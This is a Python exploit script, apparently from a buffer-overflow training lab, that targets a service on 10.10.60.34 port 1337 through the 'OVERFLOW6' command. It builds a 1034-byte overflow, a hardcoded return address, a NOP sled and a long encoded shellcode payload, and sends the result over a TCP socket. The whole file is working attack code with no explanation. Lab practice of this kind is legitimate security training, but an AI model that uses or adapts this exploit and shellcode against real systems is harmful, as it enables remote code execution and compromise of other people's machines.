#!/usr/bin/env python3

import socket

ip = "10.10.60.34"
port = 1337

prefix = "OVERFLOW6 "
offset = 1034
overflow = "A" * offset
retn = "\xc7\x11\x50\x62" # 625011c7
padding = "\x90" * 16
payload = ("\xdb\xd4\xd9\x74\x24\xf4\xbd\x0a\xa9\xb1\x13\x58\x2b\xc9\xb1"
"\x52\x31\x68\x17\x03\x68\x17\x83\xe2\x55\x53\xe6\x0e\x4d\x16"
"\x09\xee\x8e\x77\x83\x0b\xbf\xb7\xf7\x58\x90\x07\x73\x0c\x1d"
"\xe3\xd1\xa4\x96\x81\xfd\xcb\x1f\x2f\xd8\xe2\xa0\x1c\x18\x65"
"\x23\x5f\x4d\x45\x1a\x90\x80\x84\x5b\xcd\x69\xd4\x34\x99\xdc"
"\xc8\x31\xd7\xdc\x63\x09\xf9\x64\x90\xda\xf8\x45\x07\x50\xa3"
"\x45\xa6\xb5\xdf\xcf\xb0\xda\xda\x86\x4b\x28\x90\x18\x9d\x60"
"\x59\xb6\xe0\x4c\xa8\xc6\x25\x6a\x53\xbd\x5f\x88\xee\xc6\xa4"
"\xf2\x34\x42\x3e\x54\xbe\xf4\x9a\x64\x13\x62\x69\x6a\xd8\xe0"
"\x35\x6f\xdf\x25\x4e\x8b\x54\xc8\x80\x1d\x2e\xef\x04\x45\xf4"
"\x8e\x1d\x23\x5b\xae\x7d\x8c\x04\x0a\xf6\x21\x50\x27\x55\x2e"
"\x95\x0a\x65\xae\xb1\x1d\x16\x9c\x1e\xb6\xb0\xac\xd7\x10\x47"
"\xd2\xcd\xe5\xd7\x2d\xee\x15\xfe\xe9\xba\x45\x68\xdb\xc2\x0d"
"\x68\xe4\x16\x81\x38\x4a\xc9\x62\xe8\x2a\xb9\x0a\xe2\xa4\xe6"
"\x2b\x0d\x6f\x8f\xc6\xf4\xf8\xba\x12\xde\x20\xd2\x18\x1e\xc0"
"\x7f\x94\xf8\x88\x6f\xf0\x53\x25\x09\x59\x2f\xd4\xd6\x77\x4a"
"\xd6\x5d\x74\xab\x99\x95\xf1\xbf\x4e\x56\x4c\x9d\xd9\x69\x7a"
"\x89\x86\xf8\xe1\x49\xc0\xe0\xbd\x1e\x85\xd7\xb7\xca\x3b\x41"
"\x6e\xe8\xc1\x17\x49\xa8\x1d\xe4\x54\x31\xd3\x50\x73\x21\x2d"
"\x58\x3f\x15\xe1\x0f\xe9\xc3\x47\xe6\x5b\xbd\x11\x55\x32\x29"
"\xe7\x95\x85\x2f\xe8\xf3\x73\xcf\x59\xaa\xc5\xf0\x56\x3a\xc2"
"\x89\x8a\xda\x2d\x40\x0f\xfa\xcf\x40\x7a\x93\x49\x01\xc7\xfe"
"\x69\xfc\x04\x07\xea\xf4\xf4\xfc\xf2\x7d\xf0\xb9\xb4\x6e\x88"
"\xd2\x50\x90\x3f\xd2\x70")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")